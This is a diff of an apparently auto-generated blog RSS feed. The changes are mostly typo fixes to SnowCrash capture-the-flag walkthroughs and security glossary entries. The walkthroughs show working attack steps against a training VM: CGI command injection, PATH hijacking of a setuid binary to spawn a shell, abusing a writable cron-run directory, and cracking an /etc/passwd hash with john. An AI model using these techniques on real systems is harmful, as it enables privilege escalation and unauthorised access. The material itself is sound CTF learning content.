-You have new mail. The mail $ cat /var/mail/level05 */2 * * * * su -c &amp;#34;sh /usr/sbin/openarenaserver&amp;#34; - flag05 The mail content is a crontab instruction that execute
+            <description>When connecting to level05, we are greeted be the following line
+You have new mail. The mail $ cat /var/mail/level05 */2 * * * * su -c &amp;#34;sh /usr/sbin/openarenaserver&amp;#34; - flag05 The mail content is a Crontab instruction that execute
 sh /usr/sbin/openarenaserver as the user flag05 every 2 minute
 The script #!/bin/sh  for i in /opt/openarenaserver/* ; do (ulimit -t 5; bash -x &amp;#34;$i&amp;#34;) rm -f &amp;#34;$i&amp;#34; done For each file in /opt/openarenaserver execute it as a bash script.</description>
-            <content type="html"><![CDATA[<p>When connecting to <strong>level05</strong>, we are greated be the following line</p>
+            <content type="html"><![CDATA[<p>When connecting to <strong>level05</strong>, we are greeted be the following line</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">You have new mail.
 </code></pre></div><h2 id="the-mail">The mail</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /var/mail/level05
 */2 * * * * su -c <span style="color:#e6db74">&#34;sh /usr/sbin/openarenaserver&#34;</span> - flag05
-</code></pre></div><p>The mail content is a crontab instruction that execute<br>
+</code></pre></div><p>The mail content is a Crontab instruction that execute<br>
 <code>sh /usr/sbin/openarenaserver</code> as the user <strong>flag05</strong> every 2 minute</p>
 <h2 id="the-script">The script</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
@@ -1347,7 +1387,7 @@ The script #!/bin/sh  for i in /opt/openarenaserver/* ; do (ulimit -t 5; bash -x
         rm -f <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span>
 <span style="color:#66d9ef">done</span>
 </code></pre></div><p>For each file in <code>/opt/openarenaserver</code> execute it as a bash script.<br>
-Each script can run up to 5 sec ( <code>ulimit -t 5</code> )</p>
+Each script can run up to 5 sec (<code>ulimit -t 5</code>)</p>
 <h2 id="one-more-things">One more things</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -ld /opt/openarenaserver/
 drwxrwxr-x+ <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">40</span> Aug  <span style="color:#ae81ff">3</span> 13:48 /opt/openarenaserver/
@@ -1368,10 +1408,10 @@ default:user:flag05:rwx
 default:group::r-x
 default:mask::rwx
 default:other::r-x
-</code></pre></div><p>The user <strong>level05</strong> can create file in the dir <code>/opt/openarenaserver/</code> thanks to the acl
+</code></pre></div><p>The user <strong>level05</strong> can create file in the DIR <code>/opt/openarenaserver/</code> thanks to the <a href="/posts/glossary/acl">ACL</a>
 <code>default:user:level05:rwx</code></p>
 <h2 id="run-my-script">Run my script</h2>
-<p>Since its a shell script that will be executed, we have access to most of shell command</p>
+<p>Since it&rsquo;s a shell script that will be executed, we have access to most of the shell command.</p>
 <p>I will just use the following script as a POC</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
 </span><span style="color:#75715e"></span>
@@ -1389,8 +1429,9 @@ hello i<span style="color:#960050;background-color:#1e0010">&#39;</span>m flag05
             
             <guid>/posts/snowcrash/level04/</guid>
             <description>We have a file level04.pl with the setuid set
-#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub x { $y = $_[0]; print `echo $y 2&amp;gt;&amp;amp;1`; } x(param(&amp;#34;x&amp;#34;)); Quick explanation The script take a parameter x, include it in the string `echo $y 2&amp;gt;&amp;amp;1` ( where y is our x value )
-Then execute that string has an shell command then print its output.
+#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub x { $y = $_[0]; print `echo $y 2&amp;gt;&amp;amp;1`; } x(param(&amp;#34;x&amp;#34;)); Quick explanation The script take a parameter x.
+That parameter is included in the string `echo $y 2&amp;gt;&amp;amp;1` (where y is our x value).
+Then execute that string has a shell command then print its output.
 Normally the script should print what we give it to params x.</description>
             <content type="html"><![CDATA[<p>We have a file <code>level04.pl</code> with the <a href="/posts/glossary/file_permission">setuid set</a></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/perl</span>
@@ -1403,15 +1444,16 @@ Normally the script should print what we give it to params x.</description>
 }
 x(param(<span style="color:#e6db74">&#34;x&#34;</span>));
 </code></pre></div><h2 id="quick-explanation">Quick explanation</h2>
-<p>The script take a parameter <strong>x</strong>, include it in the string <code>`echo $y 2&gt;&amp;1`</code> ( where <code>y</code> is our <code>x</code> value )<br>
-Then execute that string has an shell command then print its output.</p>
+<p>The script take a parameter <strong>x</strong>.</p>
+<p>That parameter is included in the string <code>`echo $y 2&gt;&amp;1`</code> (where <code>y</code> is our <code>x</code> value).<br>
+Then execute that string has a shell command then print its output.</p>
 <p>Normally the script should print what we give it to params <strong>x</strong>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span>hello_world
 hello_world
 </code></pre></div><h2 id="the-weak-part">The Weak part</h2>
-<p>But because <strong>x</strong> is not sanitize and because <strong>x</strong> will be used in a shell command as it.<br>
-We can make the script execute arbitrary code with the right of <strong>flag04</strong></p>
-<h2 id="the-poc">The Poc</h2>
+<p>But because <strong>x</strong> is not sanitized and because <strong>x</strong> will be used in a shell command as it.<br>
+We can make the script execute arbitrary code with the as the user <strong>flag04</strong></p>
+<h2 id="the-poc">The POC</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;`whoami`&#39;</span>
 flag04
 </code></pre></div><h2 id="source">Source</h2>
@@ -1428,7 +1470,7 @@ flag04
             
             <guid>/posts/glossary/env_table/</guid>
             <description>An Environment Table is a table that is accessible by each process
-Some Environment variable to know about    name description     PATH used to list each directory to search for binary   HOME a directory to be consider as the home directory of the current user   PWD the current working directory    Source  wikipedia  </description>
+Some Environment variable to know about    name description     PATH used to list each directory to search for binary   HOME a directory to be considered as the home directory of the current user   PWD the current working directory    Source  Wikipedia  </description>
             <content type="html"><![CDATA[<p>An <strong>Environment Table</strong> is a table that is accessible by each process</p>
 <h2 id="some-environment-variable-to-know-about">Some Environment variable to know about</h2>
 <table>
@@ -1445,7 +1487,7 @@ Some Environment variable to know about    name description     PATH used to lis
 </tr>
 <tr>
 <td><strong>HOME</strong></td>
-<td>a directory to be consider as the home directory of the current user</td>
+<td>a directory to be considered as the home directory of the current user</td>
 </tr>
 <tr>
 <td><strong>PWD</strong></td>
@@ -1455,7 +1497,7 @@ Some Environment variable to know about    name description     PATH used to lis
 </table>
 <h2 id="source">Source</h2>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Environment_variable">wikipedia</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Environment_variable">Wikipedia</a></li>
 </ul>
 ]]></content>
         </item>
@@ -1467,34 +1509,34 @@ Some Environment variable to know about    name description     PATH used to lis
             
             <guid>/posts/glossary/file_permission/</guid>
             <description>Each file as his own permission set.
-It allow to
+It allows to
  control the ability of the users to view, change, navigate, and execute the contents of the file system
- Notation for Unix system permission can be see in its symbolic notation using ls -l
+ Notation for Unix system Permission can be seen in its symbolic notation using ls -l
 $ ls -l total 16 -rw-rw-r-- 1 level03 level03 0 Aug 2 17:22 foo with ls -l the 1st column is used to represent the file type and his permission.</description>
             <content type="html"><![CDATA[<p>Each file as his own permission set.<br>
-It allow to</p>
+It allows to</p>
 <blockquote>
 <p>control the ability of the users to view, change, navigate, and execute the contents of the file system</p>
 </blockquote>
 <h2 id="notation-for-unix-system">Notation for Unix system</h2>
-<p>permission can be see in its symbolic notation using <code>ls -l</code></p>
+<p>Permission can be seen in its symbolic notation using <code>ls -l</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
 total <span style="color:#ae81ff">16</span>
 -rw-rw-r-- <span style="color:#ae81ff">1</span> level03 level03    <span style="color:#ae81ff">0</span> Aug  <span style="color:#ae81ff">2</span> 17:22 foo
 </code></pre></div><p>with <code>ls -l</code> the 1st column is used to represent the file type and his permission.</p>
-<pre><code>[-][rw-rw-r--]
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[-][rw-rw-r--]
  ^  ^
  │  │
  │  └─ file permission
  └─ file type
-</code></pre><p>the file permission group is composed of 3 triad each one represented one group:<br>
+</code></pre></div><p>The file permission group is composed of 3 triads each one represented one group:<br>
 <code>User</code> / <code>Group</code> / <code>Other</code></p>
-<pre><code>[rw-][rw-][r--]
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[rw-][rw-][r--]
  ^    ^    ^
  │    │    └─ Other
  │    └─ Group
  └─ User
-</code></pre><table>
+</code></pre></div><table>
 <thead>
 <tr>
 <th>Letter</th>
@@ -1506,27 +1548,27 @@ total <span style="color:#ae81ff">16</span>
 <tr>
 <td>r</td>
 <td>1st letter of each triad</td>
-<td>allow the triad&rsquo;s group to <strong>READ</strong> the file</td>
+<td>allows the triad&rsquo;s group to <strong>READ</strong> the file</td>
 </tr>
 <tr>
 <td>w</td>
 <td>2nd letter of each triad</td>
-<td>allow the triad&rsquo;s group to <strong>MODIFY</strong> the file</td>
+<td>allows the triad&rsquo;s group to <strong>MODIFY</strong> the file</td>
 </tr>
 <tr>
 <td>x</td>
 <td>3rd letter of each triad</td>
-<td>allow the triad&rsquo;s group to <strong>EXECUTE</strong> the file</td>
+<td>allows the triad&rsquo;s group to <strong>EXECUTE</strong> the file</td>
 </tr>
 <tr>
 <td>s</td>
 <td>3rd letter of <code>User</code> triad</td>
-<td>allow the user to run the file with the system permissions of the <strong>OWNER</strong></td>
+<td>allows the user to run the file with the system permissions of the <strong>OWNER</strong></td>
 </tr>
 <tr>
 <td>s</td>
 <td>3rd letter of <code>Group</code> triad</td>
-<td>allow the user to run the file with the system permissions of the <strong>GROUP</strong></td>
+<td>allows the user to run the file with the system permissions of the <strong>GROUP</strong></td>
 </tr>
 <tr>
 <td>t</td>
@@ -1558,9 +1600,9 @@ total <span style="color:#ae81ff">16</span>
 </ul>
 <h2 id="source">Source</h2>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/File_system_permissions">file permission - wiki</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Setuid">Setuid &amp; Setgid - wiki</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Sticky_bit">Sticky bit - wiki</a></li>
+<li><a href="https://en.wikipedia.org/wiki/File_system_permissions">file permission — wiki</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Setuid">Setuid &amp; Setgid — wiki</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Sticky_bit">Sticky bit — wiki</a></li>
 </ul>
 ]]></content>
         </item>
@@ -1610,12 +1652,12 @@ End of assembler dump.
 <span style="display:block;width:100%;background-color:#3c3d38">0x80485e0:	<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>
 </span></code></pre></td></tr></table>
 </div>
-</div><p>We jump to what we are interesting in, the <code>system</code> call.<br>
-Put it together, we get the following line in <code>C</code>.</p>
+</div><p>We jump to what we are interested in: the <code>system</code> call.<br>
+Put it together, the call the <code>system</code> look like the following line in <code>C</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">system(<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>);
 </code></pre></div><h2 id="exploiting-the-executable">Exploiting the executable</h2>
-<p>As you can see, we can exploit the <code>system</code> call and making it execute arbitrary code by modifying the <code>PATH</code> <a href="/posts/glossary/env_table">env variable</a>.</p>
-<p>With the following example, I manage the execute a shell with the right of <code>flag03</code>.</p>
+<p>As you can see, we can exploit the <code>system</code> call and making it execute arbitrary code by modifying the <code>PATH</code> <a href="/posts/glossary/env_table">Env variable</a>.</p>
+<p>With the following example, I manage to execute a shell with the right of <code>flag03</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir /tmp/03
 $ cd /tmp/03
 $ echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; echo
@@ -1633,21 +1675,20 @@ flag03
             <pubDate>Fri, 31 Jul 2020 19:28:20 +0200</pubDate>
             
             <guid>/posts/snowcrash/level02/</guid>
-            <description>$ file level02.pcap level02.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 16777216) level02.pcap is a file that contains tcp packets. I will use Wireshark to read the file
-just by looking at the tcp stream, we see that the user as enter a password ( but beware of special chars )
-we can use that password to connect as flag02
-What is Wireshark Wireshark is a packet analyzer tool used for network analysis</description>
-            <content type="html"><![CDATA[<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ file level02.pcap
+            <description>On our home directory, we only have the file level02.pcap
+$ file level02.pcap level02.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 16777216) level02.pcap is a file that contains TCP packets. I will use Wireshark to read the file.
+just by looking at the TCP stream, we see that the user as entered a password (but beware of special chars)
+we can use that password to connect as flag02</description>
+            <content type="html"><![CDATA[<p>On our home directory, we only have the file <code>level02.pcap</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ file level02.pcap
 level02.pcap: tcpdump capture file <span style="color:#f92672">(</span>little-endian<span style="color:#f92672">)</span> - version 2.4 <span style="color:#f92672">(</span>Ethernet, capture length 16777216<span style="color:#f92672">)</span>
-</code></pre></div><p><code>level02.pcap</code> is a file that contains tcp packets. I will use <strong>Wireshark</strong> to read the file</p>
+</code></pre></div><p><code>level02.pcap</code> is a file that contains TCP packets. I will use <strong><a href="/posts/glossary/wireshark">Wireshark</a></strong> to read the file.</p>
 
     <img src="img/wireshark.png"  class="left"  />
 
 
-<p>just by looking at the <strong>tcp stream</strong>, we see that the user as enter a password ( but beware of special chars )</p>
+<p>just by looking at the <strong>TCP stream</strong>, we see that the user as entered a password (but beware of special chars)</p>
 <p>we can use that password to connect as <code>flag02</code></p>
-<h2 id="what-is-wireshark">What is Wireshark</h2>
-<p><strong>Wireshark</strong> is a packet analyzer tool used for network analysis</p>
 ]]></content>
         </item>
         
@@ -1657,13 +1698,13 @@ level02.pcap: tcpdump capture file <span style="color:#f92672">(</span>little-en
             <pubDate>Tue, 28 Jul 2020 22:10:15 +0200</pubDate>
             
             <guid>/posts/glossary/rainbow_table/</guid>
-            <description>A Rainbow table is a table of precomputed-hash values generated from hash function. It is generaly used to crack password.
-Source  wikipedia  </description>
+            <description>A Rainbow table is a table of precomputed-hash values generated from hash function. It is generally used to crack password.
+Source  Wikipedia  </description>
             <content type="html"><![CDATA[<p>A <strong>Rainbow table</strong> is a table of precomputed-hash values generated from <a href="/posts/glossary/hash_function">hash function</a>.
-It is generaly used to crack password.</p>
+It is generally used to crack password.</p>
 <h2 id="source">Source</h2>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Rainbow_table">wikipedia</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Rainbow_table">Wikipedia</a></li>
 </ul>
 ]]></content>
         </item>
@@ -1675,12 +1716,12 @@ It is generaly used to crack password.</p>
             
             <guid>/posts/glossary/brute_force/</guid>
             <description>In cryptography, a brute force attack is when an attacker submit as many as possible passwords with the hope to guess the right password
-Source  wikipedia  </description>
+Source  Wikipedia  </description>
             <content type="html"><![CDATA[<p>In cryptography, a <strong>brute force attack</strong> is when an attacker submit as many as possible passwords
 with the hope to guess the right password</p>
 <h2 id="source">Source</h2>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Brute-force_attack">wikipedia</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Brute-force_attack">Wikipedia</a></li>
 </ul>
 ]]></content>
         </item>
@@ -1691,20 +1732,20 @@ with the hope to guess the right password</p>
             <pubDate>Tue, 28 Jul 2020 21:48:30 +0200</pubDate>
             
             <guid>/posts/glossary/hash_function/</guid>
-            <description>an hash function is a function that can take data of arbitrary size and output data to fixed size. the output of an hash function is called:
- hash value hashes digest  For example a hash function can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing
-Source  wikipedia  </description>
-            <content type="html"><![CDATA[<p>an <strong>hash function</strong> is a function that can take data of <strong>arbitrary size</strong> and output data to <strong>fixed size</strong>.
-the output of an hash function is called:</p>
+            <description>A hash function is a function that can take data of arbitrary size and output data to fixed size. The output of a hash function is called:
+ hash value hashes digest  For example a hash function can be used to map name to index in a fixed-size table (hash table) we call this process hashing
+Source  Wikipedia  </description>
+            <content type="html"><![CDATA[<p>A <strong>hash function</strong> is a function that can take data of <strong>arbitrary size</strong> and output data to <strong>fixed size</strong>.
+The output of a hash function is called:</p>
 <ul>
 <li>hash value</li>
 <li>hashes</li>
 <li>digest</li>
 </ul>
-<p>For example a <strong>hash function</strong> can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing</p>
+<p>For example a <strong>hash function</strong> can be used to map name to index in a fixed-size table (hash table) we call this process hashing</p>
 <h2 id="source">Source</h2>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Hash_function">wikipedia</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Hash_function">Wikipedia</a></li>
 </ul>
 ]]></content>
         </item>
@@ -1715,16 +1756,16 @@ the output of an hash function is called:</p>
             <pubDate>Tue, 28 Jul 2020 21:36:02 +0200</pubDate>
             
             <guid>/posts/snowcrash/level01/</guid>
-            <description>when looking the file /etc/passwd, we see that the user flag01 has is hash password written in the deprecated password column
-$ grep flag01 /etc/passwd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash It exist some tools to decrypt hash that used different attack method like brute force or wordlist. I will use john for this level.
-we extract the line that contains the hash to password.txt
+            <description>When looking the file /etc/passwd, we see that the user flag01 has is hash password written in the deprecated password column
+$ grep flag01 /etc/passwd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash It exists some tools to decrypt hash that used different attack method like brute force or wordlist. I will use john for this level.
+We extract the line that contains the hash to password.txt
 $ ssh -p 4242 level01@snowcrash grep flag01 /etc/passwd &amp;gt; password.txt [ .</description>
-            <content type="html"><![CDATA[<p>when looking the file <code>/etc/passwd</code>, we see that the user <strong>flag01</strong> has is <a href="/posts/glossary/hash_function">hash</a> password written in the <em>deprecated password column</em></p>
+            <content type="html"><![CDATA[<p>When looking the file <code>/etc/passwd</code>, we see that the user <strong>flag01</strong> has is <a href="/posts/glossary/hash_function">hash</a> password written in the <em>deprecated password column</em></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ grep flag01 /etc/passwd
 flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
-</code></pre></div><p>It exist some tools to decrypt hash that used different attack method like <a href="/posts/glossary/brute_force">brute force</a> or <a href="/posts/glossary/ranbow_table">wordlist</a>.
+</code></pre></div><p>It exists some tools to decrypt hash that used different attack method like <a href="/posts/glossary/brute_force">brute force</a> or <a href="/posts/glossary/rainbow_table">wordlist</a>.
 I will use <code>john</code> for this level.</p>
-<p>we extract the line that contains the hash to <code>password.txt</code></p>
+<p>We extract the line that contains the hash to <code>password.txt</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ssh -p <span style="color:#ae81ff">4242</span> level01@snowcrash grep flag01 /etc/passwd &gt; password.txt
 <span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
 </code></pre></div><p>then we execute <code>john</code> to decrypt the password</p>
@@ -1734,9 +1775,9 @@ Using default input encoding: UTF-8
 1g 0:00:00:00 DONE 2/3 <span style="color:#f92672">(</span>2020-08-02 14:13<span style="color:#f92672">)</span> 10.00g/s 89740p/s 89740c/s 89740C/s 123456..nutmegs
 Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
 </code></pre></div><p>and that its, we get the password to connect to <code>flag01</code> and get the flag</p>
-<h2 id="more-about-how-linux-save-password-of-users">More about how linux save password of users</h2>
-<p>the older version of linux was storing the password in the file <code>/etc/passwd</code>.
-now linux store user account and password separately in <code>/etc/passwd</code> and <code>/etc/shadow</code> respectively</p>
+<h2 id="more-about-how-linux-save-password-of-users">More about how Linux save password of users</h2>
+<p>The older version of Linux was storing the password in the file <code>/etc/passwd</code>.
+Now Linux store user account and password separately in <code>/etc/passwd</code> and <code>/etc/shadow</code> respectively.</p>
 ]]></content>
         </item>
         
@@ -1746,12 +1787,12 @@ now linux store user account and password separately in <code>/etc/passwd</code>
             <pubDate>Tue, 28 Jul 2020 18:38:17 +0200</pubDate>
             
             <guid>/posts/glossary/rot_permutation/</guid>
-            <description>a Rot Permutation or Cesar Permutation is a method to transform a phrase into another by permuting char with another n-th letter
+            <description>A Rot Permutation or Cesar Permutation is a method to transform a phrase into another by permuting char with another nth letter
 generally we add the amount of rotation to the function name:
  rotXX | rot-XX where XX is the rotation count
- Example     1 5 10 13 26 &amp;hellip;     a b f k n a &amp;hellip;   b c g l o b &amp;hellip;   c d h m p c &amp;hellip;   &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip;    with rot13 hello world become uryyb jbeyq</description>
-            <content type="html"><![CDATA[<p>a Rot Permutation or Cesar Permutation is a method to transform a phrase into another
-by permuting char with another n-th letter</p>
+ Example     1 5 10 13 26 &amp;hellip;     a b f k n a &amp;hellip;   b c g l o b &amp;hellip;   c d h m p c &amp;hellip;   &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip; &amp;hellip;    With rot13 hello world become uryyb jbeyq</description>
+            <content type="html"><![CDATA[<p>A Rot Permutation or Cesar Permutation is a method to transform a phrase into another
+by permuting char with another nth letter</p>
 <p>generally we add the amount of rotation to the function name:</p>
 <blockquote>
 <p>rotXX | rot-XX where XX is the rotation count</p>
@@ -1808,7 +1849,7 @@ by permuting char with another n-th letter</p>
 </tr>
 </tbody>
 </table>
-<p>with rot13 <code>hello world</code> become <code>uryyb jbeyq</code></p>
+<p>With rot13 <code>hello world</code> become <code>uryyb jbeyq</code></p>
 ]]></content>
         </item>
         
@@ -1820,10 +1861,10 @@ by permuting char with another n-th letter</p>
             <guid>/posts/glossary/ctf/</guid>
             <description>CTF stand for Capture The Flag(s).
 It&amp;rsquo;s a type of game/exercise were you, the player need to find the flag.
-The flag is generally a string, but it can represented in other way.</description>
+The flag is generally a string, but it can be represented in other way.</description>
             <content type="html"><![CDATA[<p>CTF stand for Capture The Flag(s).</p>
 <p>It&rsquo;s a type of game/exercise were you, the player need to find the flag.</p>
-<p>The flag is generally a string, but it can represented in other way.</p>
+<p>The flag is generally a string, but it can be represented in other way.</p>
 ]]></content>
         </item>
         
@@ -1833,9 +1874,9 @@ The flag is generally a string, but it can represented in other way.</descriptio
             <pubDate>Mon, 27 Jul 2020 23:03:11 +0200</pubDate>
             
             <guid>/posts/glossary/vm/</guid>
-            <description>VM stand for Virtual Machine, it&amp;rsquo;s a &amp;ldquo;machine&amp;rdquo; that will be run inside another machine. Crazy right ?
+            <description>VM stand for Virtual Machine, it&amp;rsquo;s a “machine” that will be run inside another machine. Crazy right ?
 To use a virtual Machine we some software like VirtualBox or VMWare</description>
-            <content type="html"><![CDATA[<p>VM stand for Virtual Machine, it&rsquo;s a &ldquo;machine&rdquo; that will be run inside another machine.
+            <content type="html"><![CDATA[<p>VM stand for Virtual Machine, it&rsquo;s a “machine” that will be run inside another machine.
 Crazy right ?</p>
 <p>To use a virtual Machine we some software like VirtualBox or VMWare</p>
 ]]></content>
@@ -1847,20 +1888,20 @@ Crazy right ?</p>
             <pubDate>Mon, 27 Jul 2020 22:51:34 +0200</pubDate>
             
             <guid>/posts/snowcrash/level00/</guid>
-            <description>on connection to level00, we arrive on a empty home directory
-An interesting file because we don&amp;rsquo;t have any file present in the home directory, we search for file related to the user flag00, our target.
-first we search for with flag00 as owner
-$ find / -user flag00 2&amp;gt;/dev/null /usr/sbin/john /rofs/usr/sbin/john Cesar, my old friend The file /usr/sbin/john contains a odd string but its not our password.
+            <description>On connection to level00, we arrive at an empty home directory
+An interesting file Because we don&amp;rsquo;t have any file present in the home directory, we search for file related to the user flag00, our target.
+First we search for with flag00 as owner
+$ find / -user flag00 2&amp;gt;/dev/null /usr/sbin/john /rofs/usr/sbin/john Cesar, my old friend The file /usr/sbin/john contains an odd string but it&amp;rsquo;s not our password.
 $ cat /usr/sbin/john cdiiddwpgswtgt  The filename john refer to a tool to find weak passwords of your users.</description>
-            <content type="html"><![CDATA[<p>on connection to level00, we arrive on a empty home directory</p>
+            <content type="html"><![CDATA[<p>On connection to level00, we arrive at an empty home directory</p>
 <h2 id="an-interesting-file">An interesting file</h2>
-<p>because we don&rsquo;t have any file present in the home directory, we search for file related to the user <strong>flag00</strong>, our target.</p>
-<p>first we search for with <strong>flag00</strong> as owner</p>
+<p>Because we don&rsquo;t have any file present in the home directory, we search for file related to the user <strong>flag00</strong>, our target.</p>
+<p>First we search for with <strong>flag00</strong> as owner</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find / -user flag00 2&gt;/dev/null
 /usr/sbin/john
 /rofs/usr/sbin/john
 </code></pre></div><h2 id="cesar-my-old-friend">Cesar, my old friend</h2>
-<p>The file <code>/usr/sbin/john</code> contains a odd string but its not our password.</p>
+<p>The file <code>/usr/sbin/john</code> contains an odd string but it&rsquo;s not our password.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /usr/sbin/john
 cdiiddwpgswtgt
 </code></pre></div><blockquote>
@@ -1868,7 +1909,7 @@ cdiiddwpgswtgt
 </blockquote>
 <p>So the string we found must be decoded first, I go to <a href="https://www.dcode.fr/chiffre-rot">dcode root-n</a> to decode the string using the <a href="/posts/glossary/root_permutation">root permutation</a> method.</p>
 <p>With an automatic decode we found an interesting string.</p>
-<p>We connect to <strong>flag00</strong> using <code>su flag00</code> with the decoded string, and voila we can get the flag</p>
+<p>We connect to <strong>flag00</strong> using <code>su flag00</code> with the decoded string, and voilà we can get the flag</p>
 <h2 id="source">Source</h2>
 <ul>
 <li><a href="https://www.dcode.fr">dcode.fr</a></li>
